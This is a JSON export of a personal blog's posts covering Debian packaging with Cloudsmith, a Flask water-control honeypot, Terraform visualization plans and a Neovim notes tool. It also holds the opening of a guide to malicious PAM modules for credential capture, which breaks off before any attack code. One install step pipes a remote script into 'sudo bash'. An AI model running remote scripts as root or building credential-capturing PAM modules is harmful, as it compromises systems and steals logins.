{"allContent":{"docusaurus-plugin-content-blog":{"default":{"blogSidebarTitle":"Recent posts","blogPosts":[{"id":"/2024/09/15/from-source-to-system-on-debian","metadata":{"permalink":"/blog/2024/09/15/from-source-to-system-on-debian","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-09-15-from-source-to-system-on-debian.md","source":"@site/blog/2024-09-15-from-source-to-system-on-debian.md","title":"From Source to System: Packaging and Delivering Tools to Debian-based Distros","description":"Introduction","date":"2024-09-15T00:00:00.000Z","tags":[],"readingTime":5.88,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"nextItem":{"title":"Homegrown Honeypots: Simulating a Water Control System in my Home Office","permalink":"/blog/2024/08/28/homegrown-honeypots"}},"content":"## Introduction\n\nAs I've been developing new features and bug fixes for Terramaid, a tool that visualizes Terraform configurations using Mermaid, I've also focused on making the tool available on as many systems as possible. I've always valued having a straightforward and simple installation method (along with good documentation and even better code) for my tools. Throughout this learning journey, I've been fortunate to have contributors assist in making Terramaid accessible on Mac systems via Homebrew (thank you [Rui](https://github.com/chenrui333)) and on systems using Docker to spin up images of Terramaid (thank you [Tom](https://github.com/FalcoSuessgott)). These contributions have greatly increased the project's accessibility to many users I couldn't reach initially.\n\nCurrently, we support installation methods using Homebrew,Go installations, building from source, Docker images, and, as of yesterday, Debian-based systems via a Cloudsmith-hosted Apt repository. Today, I'd like to cover how I manage the repository using Infrastructure-as-Code, the manual process (soon to be automated) for building Debian packages for Terramaid, and how to use this installation method on Debian systems.\n\n## Managing the Repository\n\nCloudsmith is a cloud-native, hosted package management service that supports a lot of native package and container technologies. I've previously written Terraform components for this service and found their management system straightforward, enabling quick and simple implementation. Another benefit is their generous free-tier for individual contributors and open-source projects, making the decision even easier. Below is my simple Terraform configuration for managing the repository (I created this in about five minutes, so please don't be too critical):\n\n```terraform\n# main.tf\n# Please don't judge that the hardcoded parameters which aren't parameterized (yet)\n\ndata \"cloudsmith_organization\" \"rosesecurity\" {\n  slug = \"rosesecurity\"\n}\n\n# Repository for Terramaid packages\nresource \"cloudsmith_repository\" \"terramaid\" {\n  description = \"Terramaid Apt Package Repository\"\n  name        = \"Terramaid\"\n  namespace   = data.cloudsmith_organization.rosesecurity.slug_perm\n  slug        = \"terramaid\"\n\n  # Privileges\n  copy_own          = true\n  copy_packages     = \"Write\"\n  replace_packages  = \"Write\"\n  default_privilege = \"Read\"\n  delete_packages   = \"Admin\"\n  view_statistics   = \"Read\"\n\n  # Package settings\n  repository_type            = \"Public\"\n  use_debian_labels          = true\n  use_vulnerability_scanning = true\n\n  raw_package_index_enabled            = true\n  raw_package_index_signatures_enabled = true\n}\n\nresource \"cloudsmith_license_policy\" \"terramaid_policy\" {\n  name                    = \"Terramaid License Policy\"\n  description             = \"Terramaid license policy\"\n  spdx_identifiers        = [\"Apache-2.0\"]\n  on_violation_quarantine = true\n  organization            = data.cloudsmith_organization.rosesecurity.slug\n}\n```\n\nThis configuration creates a package repository and adds a Cloudsmith license policy to ensure that software is used, modified, and distributed in compliance with licensing requirements. I typically utilize Apache 2.0 licensing for my projects, as I appreciate the permissive nature and compatibility with other open-source license. Nevertheless, I digress; the created repository looks like the following:\n\n![Cloudsmith Terramaid Repository](../static/img/cloudsmith-terramaid-repository.png)\n\n## Pushing Packages\n\nWith our package repository created, we can begin testing how to push packages for distribution. I already have build pipelines defined for multi-architecture and platform Go builds, allowing for quick compilation of Linux AMD64 and ARM64 builds, which can then be packaged into `.deb` packages for distribution. To do this, I use a tool called `Effing Package Management`. I use a Mac, which already has Ruby installed, making for a quick Debian packaging experience. The `fpm` command takes three arguments:\n\n- The type of sources to include in the package\n- The type of package to output\n- The sources themselves\n\nI added a few more arguments for a comprehensive package, settling on the following command after building Terramaid for ARM and x64. The command is fairly self-explanatory:\n\n```sh\nfpm -s dir -t deb -n terramaid -v 1.12.0 \\\n--description \"A utility for generating Mermaid diagrams from Terraform configurations\" \\\n--license \"Apache 2.0\" --maintainer \"rosesecurityresearch@proton.me\" \\\n--url \"https://github.com/RoseSecurity/Terramaid\" --vendor \"RoseSecurity\" \\\n-a <ARCH> ./terramaid=/usr/local/bin/terramaid\n```\n\nWhich created `terramaid_1.12.0_<ARCH>.deb`. With package in hand (or terminal), I decided to push it to the Cloudsmith repository using their provided CLI tool:\n\n```console\n❯ cloudsmith push deb rosesecurity/terramaid/any-distro/any-version terramaid_1.12.0_<ARCH>.deb\n\nChecking deb package upload parameters ... OK\nChecking terramaid_1.12.0_<ARCH>.deb file upload parameters ... OK\nRequesting file upload for terramaid_1.12.0_<ARCH>.deb ... OK\nUploading terramaid_1.12.0_<ARCH>.deb:  [####################################]  100%\nCreating a new deb package ... OK\nCreated: rosesecurity/terramaid/terramaid_1120_<ARCH>deb\n\nSynchronising terramaid_1120_<ARCH>deb-czu0:  [####################################]  100%  Quarantined / Fully Synchronised\n\nPackage synchronised successfully in 19.456939 second(s)!\n```\n\n> **NOTE:** As an aside, the Cloudsmith CLI tool requires authentication, which can be done by running `cloudsmith login|token` or by providing your API key with the `-k` option.\n\n## Downloading Packages\n\nWith the packages in the repository, I decided to download them onto a Debian-based system using the Cloudsmith-provided commands. I'm a big fan of Cloud Posse's Geodesic, a DevOps toolbox built on Debian that makes it easier for teams to use the same environment and tooling across multiple platforms. It spins up a Docker container that simplifies interaction with your cloud environment and tools. I highly recommend it, and the following excerpts are from Geodesic:\n\n```sh\n⨠ cat /etc/os-release\n\nPRETTY_NAME=\"Debian GNU/Linux 12 (bookworm)\"\nNAME=\"Debian GNU/Linux\"\nVERSION_ID=\"12\"\nVERSION=\"12 (bookworm)\"\nVERSION_CODENAME=bookworm\nID=debian\nHOME_URL=\"https://www.debian.org/\"\nSUPPORT_URL=\"https://www.debian.org/support\"\nBUG_REPORT_URL=\"https://bugs.debian.org/\"\n```\n\nCloudsmith also provides a nifty setup script that configures the Apt repository on clients. It performs some GPG key wizardy and configures the Apt repository:\n\n```sh\n⨠ curl -1sLf \\\n  'https://dl.cloudsmith.io/public/rosesecurity/terramaid/setup.deb.sh' \\\n  | sudo -E bash\nExecuting the  setup script for the 'rosesecurity/terramaid' repository ...\n\n   OK: Checking for required executable 'curl' ...\n   OK: Checking for required executable 'apt-get' ...\n   OK: Detecting your OS distribution and release using system methods ...\n ^^^^: ... Detected/provided for your OS/distribution, version and architecture:\n >>>>:\n >>>>: ... distro=debian  version=12  codename=bookworm  arch=aarch64\n >>>>:\n   OK: Checking for apt dependency 'apt-transport-https' ...\n   OK: Checking for apt dependency 'ca-certificates' ...\n   OK: Checking for apt dependency 'gnupg' ...\n   OK: Checking for apt signed-by key support ...\n   OK: Importing 'rosesecurity/terramaid' repository GPG keys ...\n   OK: Checking if upstream install config is OK ...\n   OK: Installing 'rosesecurity/terramaid' repository via apt ...\n   OK: Updating apt repository metadata cache ...\n   OK: The repository has been installed successfully - You're ready to rock!\n```\n\nWith the repository configured, we can download Terramaid using the following voodoo:\n\n```sh\napt install terramaid=<VERSION>\n```\n\nIn this case, it will look like:\n\n```sh\n⨠ apt install terramaid=1.12.0\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following NEW packages will be installed:\n  terramaid\n0 upgraded, 1 newly installed, 0 to remove and 10 not upgraded.\nNeed to get 7108 kB of archives.\nAfter this operation, 13.5 MB of additional disk space will be used.\nGet:1 https://dl.cloudsmith.io/public/rosesecurity/terramaid/deb/debian bookworm/main arm64 terramaid arm64 1.12.0 [7108 kB]\nFetched 7108 kB in 1s (5239 kB/s)\nSelecting previously unselected package terramaid.\n(Reading database ... 23201 files and directories currently installed.)\nPreparing to unpack .../terramaid_1.12.0_arm64.deb ...\nUnpacking terramaid (1.12.0) ...\nSetting up terramaid (1.12.0) ...\n```\n\nWith Terramaid downloaded, we are ready to go! The only thing left to do is automate this process using GitHub Actions for future builds and releases, which I will probably cover in an upcoming blog post.\n\nI hope this was informative for anyone looking to develop and distribute a tool to Debian systems. If you're interested in my work and would like to see more, feel free to check out my [GitHub](https://github.com/RoseSecurity) or reach out on my [LinkedIn](https://www.linkedin.com/in/rosesecurity/). I love empowering engineers to build cool things, so never hesitate to reach out with questions or thoughts. Let's build some stuff!"},{"id":"/2024/08/28/homegrown-honeypots","metadata":{"permalink":"/blog/2024/08/28/homegrown-honeypots","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-08-28-homegrown-honeypots.md","source":"@site/blog/2024-08-28-homegrown-honeypots.md","title":"Homegrown Honeypots: Simulating a Water Control System in my Home Office","description":"Background","date":"2024-08-28T00:00:00.000Z","tags":[],"readingTime":4.35,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"From Source to System: Packaging and Delivering Tools to Debian-based Distros","permalink":"/blog/2024/09/15/from-source-to-system-on-debian"},"nextItem":{"title":"The Future of Terraform Visualizations","permalink":"/blog/2024/07/29/the-future-of-terraform-visualizations"}},"content":"## Background\n\nA few weeks ago, I happened upon a [LinkedIn post](https://www.linkedin.com/posts/mikeholcomb_what-does-an-icsot-cyber-attack-actually-activity-7221167138189783040-pxzb?utm_source=share&utm_medium=member_desktop) by Mike Holcomb about the Cyber Army of Russia Reborn (CARR) targeting a water facility's HMI. The post featured a video of the attack, showing a series of clicks and keystrokes that manipulated well controls to switch lead wells, adjust large well alternators, and reset hour meters. Mike noted that while no customers lost water service, the attack could have led to a tank overflow. This got me thinking about real-world attacks, their potential impact, and their frequency. I decided to simulate a water control system in my home office to see if I could catch any bad guys in the act.\n\n## Designing the Honeypot\n\nThe first decision I faced was whether to host the honeypot on a cloud provider, a virtual machine, or a physical device. Typically, industrial control system honeypots in the cloud are easy to spot since they’re usually located within an on-premises ICS network. Shodan and Censys scanners generally identify and tag these as honeypots relatively quickly, rendering research less effective. By deploying the honeypot from my home office, I could better simulate a real-world water control system and potentially catch more sophisticated attacks. Additionally, I could mimic a device that would be more realistic to my geographic location by tailoring the HMI to appear as a local water control system. Fortunately, I had plenty of spare hardware on hand, including a mini PC with dual ports that I could later configure for advanced monitoring. With this in mind, I chose to use my mini PC running Debian 12 as the honeypot, running a containerized application to simulate the water control system. To protect the rest of my home network, I created a VLAN on my office switch and connected the mini PC to it, isolating it from the rest of the network. The network layout is shown below:\n\n```mermaid\ngraph TD\n    H[Threat Actor] -->|Internet| R[Home Router]\n    R -->|Port Forward 8080 TCP| HP[Debian Server]\n    subgraph VLAN 2\n        HP -->|Docker Container| DC[python aqueduct.py]\n        HP --> |Process| NT[tcpdump -i enp0s3 -XX]\n        NT --> |Output| PC[aqueduct.pcap]\n        DC --> |Output| LF[logs.json]\n    end\n    R --> S[Office Switch]\n    S --> VLAN2[VLAN 2]\n    VLAN2 --> HP\n\n    classDef default fill:#f0f0f0,stroke:#333,stroke-width:2px;\n    classDef vlan fill:#e6f3ff,stroke:#333,stroke-width:2px;\n    class VLAN2 vlan;\n```\n\n## Implementing the Honeypot\n\nOne thing I have learned about myself is that I am bad at naming things, which is not a fun trait to have as a software engineer. With this in mind, I dubbed this project `aqueduct`. Armed with a Python Flask application and some HTML, I was destined to find some bad guys. The script works very simply: it listens on port 8080 (as port 80 was immediately blocked by my ISP) and serves up a mostly static HTML page. I say \"mostly static\" because there are two additional pages that can be accessed from the landing screen. I crafted these pages with the intention of making them difficult to scan with automation. My goal was to force manual manipulation of the controls, pumps, and alternators. The following directory structure demonstrates how the honeypot is laid out:\n\n```console\n.\n├── aqueduct.py\n├── aqueduct.pcap\n├── logs.json\n├── requirements.txt\n├── index.html\n├── templates\n│   ├── lift-station-details.html\n│   ├── well-details.html\n```\n\nIf you're interested in the HTML templates, you can find them [here](https://gist.github.com/RoseSecurity/5fc65f37fafc182568fa0dbdc9953db8) or craft your own with some GPT magic. The real work is done in `aqueduct.py`, where the landing page is rendered with links to the templates:\n\n```py\n# Render the water control home page\n@app.route('/')\ndef index():\n    return render_template('index.html')\n```\n\nThese routes handle both GET and POST requests for the lift station details and well details pages. If a POST request is made, it captures the control action, the station being controlled, and the attacker's IP address. It's a simple and straightforward way of capturing webpage interactions and creates extremely readble and easily parsable logs.\n\n```py\n@app.route('/lift-station-details.html', methods=['GET', 'POST'])\ndef lift_station_details():\n    if request.method == 'POST':\n        control_request_data = {\n            \"control\": request.form.get('station'),\n            \"action\": request.form.get('action'),\n            \"ip_address\": request.remote_addr\n        }\n        try:\n            data = ControlRequest(**control_request_data)\n            record_request(data.dict())\n            return jsonify({\"status\": \"success\"}), 200\n        except ValidationError as e:\n            return jsonify({\"status\": \"error\", \"errors\": e.errors()}), 400\n    return render_template('lift-station-details.html')\n\n@app.route('/well-details.html', methods=['GET', 'POST'])\ndef well_details():\n    if request.method == 'POST':\n        control_request_data = {\n            \"control\": request.form.get('control'),\n            \"action\": request.form.get('action'),\n            \"ip_address\": request.remote_addr\n        }\n        try:\n            data = ControlRequest(**control_request_data)\n            record_request(data.dict())\n            return jsonify({\"status\": \"success\"}), 200\n        except ValidationError as e:\n            return jsonify({\"status\": \"error\", \"errors\": e.errors()}), 400\n    return render_template('well-details.html')\n```\n\nThe captured actions are written to a log file (`logs.json`) using the following function (as noted above, I also ran a packet capture to see what other traffic looked like hitting the server):\n\n```py\ndef record_request(data):\n    with open('logs.json', 'a') as f:\n        json.dump(data, f)\n        f.write('\\n')\n```\n\nThe final product looks like this!\n\n![aqueduct video](../static/img/aqueduct.gif)\n\nTo make the exposed server easily findable, I decided to leverage Shodan, a search engine for Internet-connected devices. By submitting a scan request to Shodan, I ensured that my honeypot would be indexed and visible to anyone using the service.\n\nHere’s the command I used to submit the scan:\n\n```sh\nshodan scan submit <network or ip address>\n```\n\nWith the honeypot now exposed, I waited to see how the world would interact with my simulated water control system... The results of this experiment? Maybe I'll share those insights next time!"},{"id":"/2024/07/29/the-future-of-terraform-visualizations","metadata":{"permalink":"/blog/2024/07/29/the-future-of-terraform-visualizations","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-07-29-the-future-of-terraform-visualizations.md","source":"@site/blog/2024-07-29-the-future-of-terraform-visualizations.md","title":"The Future of Terraform Visualizations","description":"When I set out to write Terramaid, a tool that transforms Terraform configurations into visualizations using Mermaid diagrams, I didn't fully grasp the niche problem I aimed to tackle or the obstacles ahead. My goals were to improve my Go skills, contribute to the cloud tooling ecosystem, and have fun. The weekend after releasing the tool, I was amazed by the overwhelming support, inquiries, and feature requests. Although I have contributed various tools and knowledge bases to the cybersecurity community over the years, the support for Terramaid was unmatched. I began to think I was really onto something. However, I have always been more of an engineer than a visionary. To paraphrase Linus Torvalds, I focus on fixing the potholes in front of me rather than dreaming of going to the moon. Developing Terramaid has forced me to step back, look at the bigger picture of how we can drive the next generation of Terraform visualizations, and start building.","date":"2024-07-29T00:00:00.000Z","tags":[],"readingTime":4.385,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"Homegrown Honeypots: Simulating a Water Control System in my Home Office","permalink":"/blog/2024/08/28/homegrown-honeypots"},"nextItem":{"title":"My Neovim Note-taking Workflow","permalink":"/blog/2024/07/26/my-vim-note-taking-workflow"}},"content":"When I set out to write Terramaid, a tool that transforms Terraform configurations into visualizations using Mermaid diagrams, I didn't fully grasp the niche problem I aimed to tackle or the obstacles ahead. My goals were to improve my Go skills, contribute to the cloud tooling ecosystem, and have fun. The weekend after releasing the tool, I was amazed by the overwhelming support, inquiries, and feature requests. Although I have contributed various tools and knowledge bases to the cybersecurity community over the years, the support for Terramaid was unmatched. I began to think I was really onto something. However, I have always been more of an engineer than a visionary. To paraphrase Linus Torvalds, I focus on fixing the potholes in front of me rather than dreaming of going to the moon. Developing Terramaid has forced me to step back, look at the bigger picture of how we can drive the next generation of Terraform visualizations, and start building.\n\n## The Problem\n\nIn my mind, Terramaid has one mission: to create _good_ visualizations of Terraform configurations so engineers can easily see what will be deployed into their environments. The challenge is that many factors contribute to making something _good_. In the past, I used tools like Rover to visualize Terraform plans. While Rover is comprehensive, well-documented, supported, and easy to use, it has downsides. It doesn't seamlessly integrate into pipelines where I needed visualizations the most, and a large number of resources quickly turned into a tangled web in the diagram, making it less valuable for understanding deployments. With this knowledge, my list of requirements grew. I wanted to develop a tool that creates _good_ visualizations by minimizing unnecessary output in the diagrams, providing a customizable interface to meet engineers' needs, integrating easily into existing CI/CD pipelines while also being able to run locally, and offering a well-documented, community-supported tool that does its job well.\n\n## The First Iteration\n\nThe first release of Terramaid (`0.1.0`) was not pretty. The tooling was unreliable, inconsistent, not performant, and sloppy. It was a typical Minimum Viable Product (MVP) that felt rushed out the door. Why I rushed a release of a personal hobby project, I don't know. I trialed the tool idea with the Reddit community, one of the last sources of social media that provides brutally honest feedback from anonymous people worldwide. From that experience, I learned that there was interest. A gracious respondent to my post even downloaded and tested the tool, providing feedback for improvements. The community interest sparked my motivation to begin iterating through minor releases, patching, and improving the tool daily to get it to a reliable state. The first major technical change I implemented was refactoring the manual parsing process of Terraform plan files. Initially, I wanted to understand how Terraform structured its plan files, unmarshal the JSON, and generate the Mermaid diagram. I decided to look back at Rover's internals for inspiration and discovered the `terraform-exec` Go module, which allowed me to harness the power of `terraform graph` functionality to achieve my goal. With this new knowledge, I refactored Terramaid to use Cobra for a better CLI experience, harnessed `graph` functionality and `gographviz` to convert the DOT output into Mermaid, and added documentation, demos, and example GitHub Actions and GitLab CI Pipeline examples. It was even more exciting when the community contributed improvements to the documentation, Dockerfiles, and added the tool to Homebrew's core repository. Being able to `brew install terramaid` has made me very happy. We have made many strides with Terramaid, and I've never been as excited as I am to sit down, receive feedback from the community, and develop a vision for the future of visualizations in the Terraform and Opentofu ecosystem.\n\n## Future Development\n\nA week after the initial release, I was asked to demo the tool to a larger group in the cloud community. The feedback I received was exactly what I needed to begin mapping the next steps for development. There are a few major areas where Terramaid can improve to provide a better experience. The first is in the generation of the Mermaid diagram itself. Terraform's graph functionality provides a plethora of information, from labels to provider details, and visualizing this effectively can be challenging. My ultimate goal is to provide a customizable interface for engineers to harness Terramaid to create diagrams that work for them. This starts with perfecting flowcharts before branching out to other potentially useful forms like block diagrams or even mind maps. Once we optimize in this area, the possibilities for expansion are endless.\n\nAnother area to address is how we handle large amounts of resources, as not every resource and module should have its own dedicated block. Should we provide a truncated view to the engineer? Should we utilize Mermaid's syntax to create a better view of how many of each resource will be deployed? I tend to lean toward the latter, but I am open to suggestions and recommendations from the community.\n\nAdditionally, we need to consider how we treat modules. Will they always be a black box, or is there a better way to dive deeper and visualize which resources will be provisioned as a result? This is an area that will require further investigation, but I am optimistic."},{"id":"/2024/07/26/my-vim-note-taking-workflow","metadata":{"permalink":"/blog/2024/07/26/my-vim-note-taking-workflow","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-07-26-my-vim-note-taking-workflow.md","source":"@site/blog/2024-07-26-my-vim-note-taking-workflow.md","title":"My Neovim Note-taking Workflow","description":"Past Strategies","date":"2024-07-26T00:00:00.000Z","tags":[],"readingTime":5.18,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"The Future of Terraform Visualizations","permalink":"/blog/2024/07/29/the-future-of-terraform-visualizations"},"nextItem":{"title":"Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement","permalink":"/blog/2024/07/25/crafting-malicious-pluggable-authentication-modules"}},"content":"## Past Strategies\n\nRecently, I've overhauled my development workflow, moving towards a more minimalist, command-line interface (CLI) based approach. This transition was motivated by a desire to deepen my understanding of the tools I use every day. This post details some of the changes I've made, with a focus on how I've adapted my note-taking process to this new paradigm.\n\nPrior to this shift, my note-taking process primarily relied on tools such as Obsidian for markdown rendering and a later evolution to numerous JetBrains and VS Code plugins for in-IDE note capture. However, the move to a terminal-centric workflow required a new approach to note-taking that could seamlessly integrate with my development environment (Neovim).\n\n## Telekasten\n\nAfter evaluating various options, I settled on Telekasten, a Neovim plugin that combines powerful markdown editing capabilities with journaling features.My only requirements were that the tool should make capturing daily notes simple while integrating with Neovim (particulary Telescope or FZF).  Telekasten integrates seamlessly with Telescope and the setup process is straightforward:\n\n1. Install the plugin: `Plug 'renerocksai/telekasten.nvim'`\n2. Configure in `init.lua`:\n\n```sh\nrequire('telekasten').setup({\n  home = vim.fn.expand(\"~/worklog/notes\"), -- Put the name of your notes directory here\n})\n```\n\nThis configuration enables a range of note-taking commands accessible via `:Telekasten`, including `search_notes`, `find_daily_notes`, and `goto_today`. As an aside, I later mapped the Telekasten command to `:Notes`, as it felt more intuitive to me. When creating new notes, the resulting directory structure is clean and organized:\n\n```console\n❯ ls ~/worklog/notes\n2024-07-24.md  2024-07-25.md  2024-07-26.md\n```\n\n## Another Layer\n\nTo further improve this system, I developed a Go program to compile weekly and monthly notes. The tool serves two primary purposes:\n\n1. It provides an overview of work completed over longer periods\n2. It generates summaries that can be useful for performance reviews and team check-ins (my long term goal is to harness AI to generate summaries of my worklogs through this tooling)\n\nHere is the code!\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"path/filepath\"\n\t\"sort\"\n\t\"strings\"\n\t\"time\"\n)\n\n// This program compiles weekly or monthly notes into a single file.\n// The compiled notes can be further parsed by AI to summarize weekly and monthly worklogs.\n// Ensure that the NOTES environment variable is set to your notes directory before running the program.\n\nvar (\n\tweekly  bool // Flag to indicate weekly compilation\n\tmonthly bool // Flag to indicate monthly compilation\n)\n\nfunc main() {\n\t// Get environment variable for the notes directory\n\tnotesDir := os.Getenv(\"NOTES\")\n\tcompiledNotesDir := notesDir + \"/compiled_notes\"\n\n\t// Create the compiled notes directory if it doesn't exist\n\tif _, err := os.Stat(compiledNotesDir); os.IsNotExist(err) {\n\t\tos.Mkdir(compiledNotesDir, 0755)\n\t}\n\n\t// Parse command-line flags for weekly or monthly notes compilation\n\tflag.BoolVar(&weekly, \"weekly\", false, \"Compile weekly notes\")\n\tflag.BoolVar(&monthly, \"monthly\", false, \"Compile monthly notes\")\n\tflag.Parse()\n\n\t// Execute the appropriate compilation based on the provided flag\n\tif weekly {\n\t\tfmt.Println(\"Compiling weekly notes...\")\n\t\tcompileWeeklyNotes(notesDir, compiledNotesDir)\n\t} else if monthly {\n\t\tfmt.Println(\"Compiling monthly notes...\")\n\t\tcompileMonthlyNotes(notesDir, compiledNotesDir)\n\t} else {\n\t\tfmt.Println(\"No flag provided. Please provide either -weekly or -monthly\")\n\t}\n}\n\n// compileWeeklyNotes compiles notes for the current week\nfunc compileWeeklyNotes(notesDir, compiledNotesDir string) {\n\t// Get the current date and calculate the start of the week\n\tnow := time.Now()\n\tweekday := int(now.Weekday())\n\toffset := (weekday + 6) % 7\n\tstart := now.AddDate(0, 0, -offset)\n\tstart = time.Date(start.Year(), start.Month(), start.Day(), 0, 0, 0, 0, time.Local)\n\n\t// Get all the notes for the week\n\tnotes := getNotes(notesDir, start, now)\n\n\t// Compile the notes into a single file\n\tcontent := compileNotes(notes)\n\n\t// Write the compiled notes to a file\n\tfilename := fmt.Sprintf(\"%s/weekly_notes_%s.md\", compiledNotesDir, start.Format(\"2006-01-02\"))\n\terr := os.WriteFile(filename, []byte(content), 0644)\n\tif err != nil {\n\t\tfmt.Printf(\"Error writing file: %v\\n\", err)\n\t\treturn\n\t}\n\n\tfmt.Printf(\"Weekly notes compiled and saved to %s\\n\", filename)\n}\n\n// compileMonthlyNotes compiles notes for the current month\nfunc compileMonthlyNotes(notesDir, compiledNotesDir string) {\n\t// Get the current date and calculate the start and end of the month\n\tnow := time.Now()\n\tstart := time.Date(now.Year(), now.Month(), 1, 0, 0, 0, 0, time.Local)\n\tend := start.AddDate(0, 1, -1)\n\n\t// Get all the notes for the month\n\tnotes := getNotes(notesDir, start, end)\n\n\t// Compile the notes into a single file\n\tcontent := compileNotes(notes)\n\n\t// Write the compiled notes to a file\n\tfilename := fmt.Sprintf(\"%s/monthly_notes_%s.md\", compiledNotesDir, start.Format(\"2006-01\"))\n\terr := os.WriteFile(filename, []byte(content), 0644)\n\tif err != nil {\n\t\tfmt.Printf(\"Error writing file: %v\\n\", err)\n\t\treturn\n\t}\n\n\tfmt.Printf(\"Monthly notes compiled and saved to %s\\n\", filename)\n}\n\n// getNotes retrieves all markdown files within the specified date range\nfunc getNotes(notesDir string, start, end time.Time) []string {\n\tvar notes []string\n\n\terr := filepath.Walk(notesDir, func(path string, info os.FileInfo, err error) error {\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\n\t\tif !info.IsDir() && strings.HasSuffix(info.Name(), \".md\") {\n\t\t\tdate, err := time.Parse(\"2006-01-02.md\", info.Name())\n\t\t\tif err == nil && (date.Equal(start) || date.After(start)) && (date.Equal(end) || date.Before(end)) {\n\t\t\t\tnotes = append(notes, path)\n\t\t\t}\n\t\t}\n\n\t\treturn nil\n\t})\n\n\tif err != nil {\n\t\tfmt.Printf(\"Error walking through directory: %v\\n\", err)\n\t}\n\n\tsort.Strings(notes)\n\treturn notes\n}\n\n// compileNotes combines the content of multiple note files into a single string\nfunc compileNotes(notes []string) string {\n\tvar content strings.Builder\n\n\tfor _, note := range notes {\n\t\tdata, err := os.ReadFile(note)\n\t\tif err != nil {\n\t\t\tfmt.Printf(\"Error reading file %s: %v\\n\", note, err)\n\t\t\tcontinue\n\t\t}\n\n\t\tfilename := filepath.Base(note)\n\t\tcontent.WriteString(fmt.Sprintf(\"## %s\\n\\n\", strings.TrimSuffix(filename, \".md\")))\n\t\tcontent.Write(data)\n\t\tcontent.WriteString(\"\\n\")\n\t}\n\n\treturn content.String()\n}\n```\n\nTo integrate this tool with Neovim, I added the following commands to my configuration:\n\n> :bulb: I compiled this binary as `note-compiler`\n\n```lua\n\" Define the :CompileNotesWeekly command to run note-compiler -weekly\ncommand! CompileNotesWeekly call system('note-compiler -weekly')\n\n\" Define the :CompileNotesMonthly command to run note-compiler -monthly\ncommand! CompileNotesMonthly call system('note-compiler -monthly')\n```\n\nThese commands allow for easy note compilation directly from within Neovim.\n\nThe implementation of this system results in a well-organized directory structure:\n\n```console\n❯ tree\n.\n├── 2024-07-24.md\n├── 2024-07-25.md\n├── 2024-07-26.md\n├── compiled_notes\n│   └── weekly_notes_2024-07-22.md\n```\n\n## Conclusion\n\nIf you're looking to streamline your note-taking, I would highly recommend looking into Telekasten (as I have barely scratched the surface of its abilities)! The transition to a CLI-based development workflow has not only boosted my productivity but has also rekindled my passion for the technology I use daily. I wholeheartedly endorse this approach for developers looking to deepen their connection with their tools and streamline their workflow. Let's get building!"},{"id":"/2024/07/25/crafting-malicious-pluggable-authentication-modules","metadata":{"permalink":"/blog/2024/07/25/crafting-malicious-pluggable-authentication-modules","editUrl":"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=rosesecurity/rosesecurity.github.io&skip_quickstart=true/blog/2024-07-25-crafting-malicious-pluggable-authentication-modules.md","source":"@site/blog/2024-07-25-crafting-malicious-pluggable-authentication-modules.md","title":"Crafting Malicious Pluggable Authentication Modules for Persistence, Privilege Escalation, and Lateral Movement","description":"Synopsis","date":"2024-07-25T00:00:00.000Z","tags":[],"readingTime":5.705,"hasTruncateMarker":false,"authors":[],"frontMatter":{},"unlisted":false,"prevItem":{"title":"My Neovim Note-taking Workflow","permalink":"/blog/2024/07/26/my-vim-note-taking-workflow"},"nextItem":{"title":"Infrastructure Essentials Part 1: A Terraform Recipe for Success","permalink":"/blog/2024/06/28/infrastructure-essentials-part-1"}},"content":"## Synopsis\n\nSince its inception in 1997, PAM (Pluggable Authentication Modules) have served as a library for enabling local system administrators to choose how individual applications authenticate users. A PAM module is a single executable binary file that can be loaded by the PAM interface library, which is configured locally with a system file, `/etc/pam.conf`, to authenticate a user request via the locally available authentication modules. The modules themselves will usually be located in the directory `/lib/security` or the `/usr/lib64/security` directory depending on architecture and operating system, and take the form of dynamically loadable object files.\n\nIn this guide, we will discuss how these modules can be harnessed to create malicious binaries for capturing credentials to use in persistence, privilege escalation, and lateral movement.\n\n## PAM Components\n\n![PAM](https://www.redhat.com/sysadmin/sites/default/files/styles/embed_large/public/2020-06/PAM_diagramm4.png?itok=1M-9Td1w)\n\n---\n\nAs we manipulate authentication programs, here are the useful file locations for different PAM components:\n\n### /usr/lib64/security\n\nA collection of PAM libraries that perform various checks. Most of these modules have man pages to explain the use case and options available.\n\n```console\nroot@salsa:~# ls /usr/lib64/security\npam_access.so      pam_faillock.so       pam_lastlog.so    pam_nologin.so    pam_setquota.so    pam_tty_audit.so\npam_cap.so         pam_filter.so         pam_limits.so     pam_permit.so     pam_shells.so      pam_umask.so\npam_debug.so       pam_fprintd.so        pam_listfile.so   pam_pwhistory.so  pam_sss_gss.so     pam_unix.so\npam_deny.so        pam_ftp.so            pam_localuser.so  pam_pwquality.so  pam_sss.so         pam_userdb.so\npam_echo.so        pam_gdm.so            pam_loginuid.so   pam_rhosts.so     pam_stress.so      pam_usertype.so\npam_env.so         pam_gnome_keyring.so  pam_mail.so       pam_rootok.so     pam_succeed_if.so  pam_warn.so\npam_exec.so        pam_group.so          pam_mkhomedir.so  pam_securetty.so  pam_systemd.so     pam_wheel.so\npam_extrausers.so  pam_issue.so          pam_motd.so       pam_selinux.so    pam_time.so        pam_xauth.so\npam_faildelay.so   pam_keyinit.so        pam_namespace.so  pam_sepermit.so   pam_timestamp.so\n```\n\n### /etc/pam.d\n\nA collection of configuration files for applications that call `libpam`. These files define which modules are checked, with what options, in which order, and how to handle the result. These files may be added to the system when an application is installed and are frequently edited by other 